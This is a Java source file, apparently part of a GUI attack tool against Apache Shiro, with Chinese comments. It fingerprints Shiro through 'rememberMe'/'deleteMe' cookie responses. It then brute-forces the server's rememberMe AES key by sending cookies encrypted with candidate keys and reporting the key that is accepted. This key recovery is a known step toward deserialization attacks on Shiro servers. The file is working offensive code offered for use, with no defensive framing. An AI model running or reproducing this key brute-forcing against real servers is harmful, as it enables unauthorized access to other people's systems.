package common;

import entity.ControllersFactory;
import ui.MyController;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class HttpUtils {

    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;

    // 探测的时候检测 rememberMe=delteMe的数量
    public boolean shiroDetectRequest(String method,String url) throws Exception {
        // 这个应该就是用来检测的
        this.myController.result.appendText("[+] 目标地址: " + url + "\n");
        String demoCookie = "rememberMe=xxx";   // 探测用的 rememberMe
        Map<String,List<String>> header = null;
        List<String> setCookie = null;
        if (method.equals("GET")){
            header = this.sendGetRequest(url,demoCookie);
        } else if (method.equals("POST")){
            header = this.sendPostRequest(url,demoCookie);
        }
        if (header != null) {
            setCookie = header.get("Set-Cookie");
            if (setCookie != null && setCookie.toString().contains("=deleteMe")){
                // 如果返回头中有多个 deleteme
                if (setCookie.size() > 1){
                    int index = 0;
                    for (String value:setCookie){
                        if (value.contains("=deleteMe")){
                            index +=1;
                        }
                    }
                    paramContext.put("Index", String.valueOf(index));
                }

                this.myController.result.appendText("[+] 检测到 Shiro 框架\n");
                return true;
            } else {
                this.myController.result.appendText("[!] 未检测到 Shiro 框架\n");
                return false;
            }
        } else {
            this.myController.result.appendText("[!] 没有发现 Header 头\n");
            return false;
        }
    }

    public boolean shiroKeyBruteRequest(String method,String url,String key) throws Exception{
        Map<String,List<String>> header = null;
        List<String> setCookie = null;

        String detectCookie = "rememberMe=" + AesCbcEncrypt.payloadEncrypt(key);

        if (method.equals("GET")){
            header = this.sendGetRequest(url,detectCookie);
        } else {
            header = this.sendPostRequest(url,detectCookie);
        }


        int index = Integer.parseInt(paramContext.get("Index"));

        if (header != null){
            setCookie = header.get("Set-Cookie");
            // 判断deleteme 的数量
            if (setCookie != null && index > 1){
                if (setCookie.size() >= 1){
                    int size = 0;
                    for (String value:setCookie){
                        if (value.contains("=deleteMe")){
                            size +=1;
                        }
                    }
                    if (size < index){
                        this.myController.result.appendText("密钥为: " + key + "\n\n");
                        return true;
                    }
                }
            }

            if (setCookie == null || !setCookie.toString().contains("=deleteMe")){
                this.myController.result.appendText("密钥为: " + key + "\n\n");
                return true;
            }
        } else {
            this.myController.result.appendText("[!] 没有发现 Header 头\n");
            return false;
        }
        return false;
    }



    // Java get 发包
    public Map<String,List<String>> sendGetRequest(String url, String cookie) throws Exception{
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        httpURLConnection = (HttpURLConnection) u.openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setConnectTimeout(5);
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        httpURLConnection.setRequestProperty("Connection", "close");
        if (cookie != null){
            httpURLConnection.addRequestProperty("Cookie",cookie);
        }
        Map<String, List<String>> header = httpURLConnection.getHeaderFields();
        return header;
    }

    // java post 发包
    public Map<String,List<String>> sendPostRequest(String url,String cookie) throws Exception {
        String param = this.paramContext.get("PostParam");
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        httpURLConnection = (HttpURLConnection) u.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        httpURLConnection.setRequestProperty("content-type",this.paramContext.get("ContentType"));
        httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        httpURLConnection.setRequestProperty("Connection", "close");

        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        httpURLConnection.setConnectTimeout(5);
        if (cookie != null){
            httpURLConnection.addRequestProperty("Cookie",cookie);
        }
        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write(param.getBytes());
        outputStream.flush();
        outputStream.close();

        // 获取返回头信息
        Map<String,List<String>> header = httpURLConnection.getHeaderFields();
        return header;
    }



}
